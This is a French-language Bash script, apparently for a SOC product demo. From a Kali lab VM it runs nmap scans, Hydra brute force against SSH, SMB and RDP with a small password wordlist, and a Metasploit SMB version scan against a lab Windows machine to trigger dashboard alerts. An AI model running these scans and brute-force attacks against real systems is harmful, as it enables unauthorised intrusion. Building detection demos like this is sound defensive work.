#!/bin/bash
# ══════════════════════════════════════════════════════════════════════════════
#  SENTINEL PME AFRICA — Scripts d'attaque pour la demonstration Kali Linux
#  A executer sur la VM SENTINEL-KALI (192.168.56.10)
#  Cible : machine Windows SENTINEL-WIN (192.168.56.20)
# ══════════════════════════════════════════════════════════════════════════════

TARGET_WIN="192.168.56.20"
TARGET_SOC="192.168.56.30"

# Couleurs
R='\033[0;31m' G='\033[0;32m' Y='\033[1;33m' B='\033[0;34m'
C='\033[0;36m' W='\033[1;37m' NC='\033[0m'

banner() {
  clear
  echo -e "${B}╔══════════════════════════════════════════════════════════════╗${NC}"
  echo -e "${B}║    SENTINEL PME AFRICA — Console d'attaque Kali Linux        ║${NC}"
  echo -e "${B}║                                                              ║${NC}"
  echo -e "${B}║  Cible Windows : ${TARGET_WIN}                              ║${NC}"
  echo -e "${B}║  Serveur SOC   : ${TARGET_SOC}                              ║${NC}"
  echo -e "${B}║  Dashboard     : http://${TARGET_SOC}:8080/dashboard.html   ║${NC}"
  echo -e "${B}╚══════════════════════════════════════════════════════════════╝${NC}"
  echo ""
}

# Verification de la connectivite avant toute attaque
check_connectivity() {
  echo -e "${Y}[*] Verification de la connectivite reseau...${NC}"
  if ping -c 1 -W 2 $TARGET_WIN > /dev/null 2>&1; then
    echo -e "${G}[✓] Cible Windows $TARGET_WIN : accessible${NC}"
  else
    echo -e "${R}[✗] Cible Windows $TARGET_WIN : INACCESSIBLE${NC}"
    echo -e "${R}    Verifier que la VM Windows est demarree et sur VMnet1${NC}"
    exit 1
  fi
  if ping -c 1 -W 2 $TARGET_SOC > /dev/null 2>&1; then
    echo -e "${G}[✓] Serveur SOC $TARGET_SOC : accessible${NC}"
  else
    echo -e "${Y}[!] Serveur SOC inaccessible. Les alertes n'apparaitront pas sur le dashboard.${NC}"
  fi
  echo ""
}

# Creer la wordlist de mots de passe
create_wordlist() {
  cat > /tmp/sentinel_passwords.txt << 'PASS'
admin
password
123456
Administrator
pme2026
yaounde
cameroun
azerty
Password1
sentinel
qwerty123
Welcome1
P@ssw0rd
letmein
Yaounde2024
PASS
  echo -e "${G}[✓] Wordlist creee : /tmp/sentinel_passwords.txt (15 mots de passe)${NC}"
}

# ══════════════════════════════════════════════════════════════════════════════
# ATTAQUE 1 : Scan Nmap rapide
# Declenche : alerte PORT_SCAN de severite ELEVEE
# ══════════════════════════════════════════════════════════════════════════════
attack_nmap_quick() {
  echo -e "${W}━━━ ATTAQUE 1 : Scan Nmap Rapide ━━━${NC}"
  echo -e "${R}[ATTAQUE] Commande : nmap -sV -T4 $TARGET_WIN${NC}"
  echo -e "${Y}[*] Attente de l'alerte PORT_SCAN sur le dashboard...${NC}"
  echo ""
  nmap -sV -T4 $TARGET_WIN
  echo ""
  echo -e "${G}[→] Alerte attendue sur le dashboard : PORT_SCAN | ELEVE${NC}"
  echo -e "${G}[→] Actions recommandees : bloquer l'IP source dans le pare-feu${NC}"
}

# ══════════════════════════════════════════════════════════════════════════════
# ATTAQUE 2 : Scan Nmap agressif (OS + services + scripts)
# Declenche : alerte PORT_SCAN de severite ELEVEE avec plus d'indicateurs
# ══════════════════════════════════════════════════════════════════════════════
attack_nmap_aggressive() {
  echo -e "${W}━━━ ATTAQUE 2 : Scan Nmap Agressif ━━━${NC}"
  echo -e "${R}[ATTAQUE] Commande : nmap -A -T4 -p 1-1000 $TARGET_WIN${NC}"
  echo -e "${Y}[*] Ce scan detecte l'OS, les services et lance des scripts NSE...${NC}"
  echo ""
  nmap -A -T4 -p 1-1000 $TARGET_WIN
  echo ""
  echo -e "${G}[→] Alerte attendue : PORT_SCAN | ELEVE | 1000 ports sondes${NC}"
}

# ══════════════════════════════════════════════════════════════════════════════
# ATTAQUE 3 : Brute force SSH avec Hydra
# Declenche : alerte BRUTE_FORCE de severite CRITIQUE
# ══════════════════════════════════════════════════════════════════════════════
attack_hydra_ssh() {
  echo -e "${W}━━━ ATTAQUE 3 : Brute Force SSH (Hydra) ━━━${NC}"
  create_wordlist
  echo -e "${R}[ATTAQUE] Commande : hydra -l Administrator -P /tmp/sentinel_passwords.txt ssh://$TARGET_WIN${NC}"
  echo ""
  hydra -l Administrator -P /tmp/sentinel_passwords.txt -t 4 -V ssh://$TARGET_WIN 2>&1 | head -25
  echo ""
  echo -e "${G}[→] Alerte attendue : BRUTE_FORCE | CRITIQUE | port SSH 22${NC}"
}

# ══════════════════════════════════════════════════════════════════════════════
# ATTAQUE 4 : Brute force SMB avec Hydra (port 445)
# Declenche : alerte BRUTE_FORCE de severite CRITIQUE
# ══════════════════════════════════════════════════════════════════════════════
attack_hydra_smb() {
  echo -e "${W}━━━ ATTAQUE 4 : Brute Force SMB/Windows (Hydra) ━━━${NC}"
  [ ! -f /tmp/sentinel_passwords.txt ] && create_wordlist
  echo -e "${R}[ATTAQUE] Commande : hydra -l Administrator -P /tmp/sentinel_passwords.txt smb://$TARGET_WIN${NC}"
  echo ""
  hydra -l Administrator -P /tmp/sentinel_passwords.txt smb://$TARGET_WIN 2>&1 | head -20
  echo ""
  echo -e "${G}[→] Alerte attendue : BRUTE_FORCE | CRITIQUE | port SMB 445${NC}"
}

# ══════════════════════════════════════════════════════════════════════════════
# ATTAQUE 5 : Brute force RDP avec Hydra (port 3389)
# Declenche : alerte BRUTE_FORCE de severite CRITIQUE
# ══════════════════════════════════════════════════════════════════════════════
attack_hydra_rdp() {
  echo -e "${W}━━━ ATTAQUE 5 : Brute Force RDP/Bureau a distance (Hydra) ━━━${NC}"
  [ ! -f /tmp/sentinel_passwords.txt ] && create_wordlist
  echo -e "${R}[ATTAQUE] Commande : hydra -l Administrator -P /tmp/sentinel_passwords.txt rdp://$TARGET_WIN${NC}"
  echo -e "${Y}[*] Le Bureau a distance doit etre active sur Windows cible...${NC}"
  echo ""
  hydra -l Administrator -P /tmp/sentinel_passwords.txt rdp://$TARGET_WIN 2>&1 | head -20
  echo ""
  echo -e "${G}[→] Alerte attendue : BRUTE_FORCE | CRITIQUE | port RDP 3389${NC}"
}

# ══════════════════════════════════════════════════════════════════════════════
# ATTAQUE 6 : Reconnaissance Metasploit (SMB version)
# Declenche : activite reseau suspecte sur port 445
# ══════════════════════════════════════════════════════════════════════════════
attack_metasploit() {
  echo -e "${W}━━━ ATTAQUE 6 : Reconnaissance Metasploit ━━━${NC}"
  echo -e "${R}[ATTAQUE] Module : auxiliary/scanner/smb/smb_version${NC}"
  echo ""
  msfconsole -q -x \
    "use auxiliary/scanner/smb/smb_version; \
     set RHOSTS $TARGET_WIN; \
     set THREADS 1; \
     run; \
     exit" 2>&1 | tail -15
  echo ""
  echo -e "${G}[→] Activite SMB suspecte detectee${NC}"
}

# ══════════════════════════════════════════════════════════════════════════════
# SCENARIO COMPLET : Chaine d'attaque realiste en 3 phases
# Reproduit exactement ce qu'un vrai attaquant ferait
# ══════════════════════════════════════════════════════════════════════════════
scenario_complet() {
  echo -e "${W}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━${NC}"
  echo -e "${W}   SCENARIO COMPLET : Chaine d'attaque realiste en 3 phases${NC}"
  echo -e "${W}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━${NC}"
  echo ""
  echo -e "${C}Ce scenario reproduit une vraie chaine d'attaque :${NC}"
  echo -e "${C}  Phase 1 : Reconnaissance (Nmap)${NC}"
  echo -e "${C}  Phase 2 : Intrusion (Hydra brute force)${NC}"
  echo -e "${C}  Phase 3 : Exploitation (Metasploit)${NC}"
  echo ""
  echo -e "${Y}Ouvrez le dashboard SENTINEL sur http://$TARGET_SOC:8080/dashboard.html${NC}"
  echo -e "${Y}Observez les alertes apparaitre en temps reel pendant l'attaque${NC}"
  echo ""
  read -p "Appuyer sur ENTREE pour commencer le scenario..."

  # === PHASE 1 : RECONNAISSANCE ===
  echo ""
  echo -e "${R}╔══════════════════════════════════════════╗${NC}"
  echo -e "${R}║  PHASE 1 : RECONNAISSANCE (Nmap scan)   ║${NC}"
  echo -e "${R}╚══════════════════════════════════════════╝${NC}"
  echo -e "${Y}L'attaquant decouvre les services de la machine cible...${NC}"
  sleep 2
  nmap -sV -T4 --top-ports 200 $TARGET_WIN 2>&1 | tail -20
  echo ""
  echo -e "${G}>>> SENTINEL devrait afficher l'alerte PORT_SCAN dans les 10 secondes${NC}"
  echo -e "${G}>>> Message proactif : 'Brute force probable dans les prochaines minutes'${NC}"
  echo ""
  read -p "Phase 1 terminee. Appuyer sur ENTREE pour la Phase 2..."

  # === PHASE 2 : BRUTE FORCE ===
  echo ""
  echo -e "${R}╔══════════════════════════════════════════╗${NC}"
  echo -e "${R}║  PHASE 2 : INTRUSION (Hydra brute force)║${NC}"
  echo -e "${R}╚══════════════════════════════════════════╝${NC}"
  echo -e "${Y}L'attaquant tente de deviner le mot de passe...${NC}"
  [ ! -f /tmp/sentinel_passwords.txt ] && create_wordlist
  sleep 2
  hydra -l Administrator -P /tmp/sentinel_passwords.txt -t 4 smb://$TARGET_WIN 2>&1 | head -18
  echo ""
  echo -e "${G}>>> SENTINEL doit afficher BRUTE_FORCE | CRITIQUE${NC}"
  echo -e "${G}>>> Score de risque passe au rouge${NC}"
  echo ""
  read -p "Phase 2 terminee. Appuyer sur ENTREE pour la Phase 3..."

  # === PHASE 3 : EXPLOITATION ===
  echo ""
  echo -e "${R}╔══════════════════════════════════════════╗${NC}"
  echo -e "${R}║  PHASE 3 : EXPLOITATION (Metasploit)    ║${NC}"
  echo -e "${R}╚══════════════════════════════════════════╝${NC}"
  echo -e "${Y}L'attaquant tente d'identifier la version de Windows...${NC}"
  sleep 2
  msfconsole -q -x \
    "use auxiliary/scanner/smb/smb_version; \
     set RHOSTS $TARGET_WIN; \
     run; \
     exit" 2>&1 | tail -10

  echo ""
  echo -e "${W}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━${NC}"
  echo -e "${G}  SCENARIO COMPLET TERMINE !${NC}"
  echo -e "${G}  Observez le dashboard : 3 types d'alertes, score CRITIQUE${NC}"
  echo -e "${G}  Actions recommandees en francais pour chaque incident${NC}"
  echo -e "${W}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━${NC}"
}

# ══════════════════════════════════════════════════════════════════════════════
# MENU PRINCIPAL
# ══════════════════════════════════════════════════════════════════════════════
menu() {
  banner
  check_connectivity

  echo -e "${W}Choisissez le type d'attaque a demonstrer :${NC}"
  echo ""
  echo -e "  ${Y}1${NC}) Scan Nmap rapide         → alerte ${Y}PORT_SCAN${NC} (ELEVE)"
  echo -e "  ${Y}2${NC}) Scan Nmap agressif        → alerte ${Y}PORT_SCAN${NC} (ELEVE +)"
  echo -e "  ${Y}3${NC}) Brute force SSH (Hydra)   → alerte ${R}BRUTE_FORCE${NC} (CRITIQUE)"
  echo -e "  ${Y}4${NC}) Brute force SMB (Hydra)   → alerte ${R}BRUTE_FORCE${NC} (CRITIQUE)"
  echo -e "  ${Y}5${NC}) Brute force RDP (Hydra)   → alerte ${R}BRUTE_FORCE${NC} (CRITIQUE)"
  echo -e "  ${Y}6${NC}) Reconnaissance Metasploit → activite SMB suspecte"
  echo -e "  ${G}7${NC}) SCENARIO COMPLET (3 phases automatiques)"
  echo -e "  ${Y}0${NC}) Quitter"
  echo ""
  read -p "Votre choix [0-7] : " choice

  echo ""
  case $choice in
    1) attack_nmap_quick ;;
    2) attack_nmap_aggressive ;;
    3) attack_hydra_ssh ;;
    4) attack_hydra_smb ;;
    5) attack_hydra_rdp ;;
    6) attack_metasploit ;;
    7) scenario_complet ;;
    0) echo -e "${G}Au revoir.${NC}"; exit 0 ;;
    *) echo -e "${R}Choix invalide.${NC}" ;;
  esac

  echo ""
  read -p "Appuyer sur ENTREE pour revenir au menu..."
  menu
}

# Lancer le menu
menu
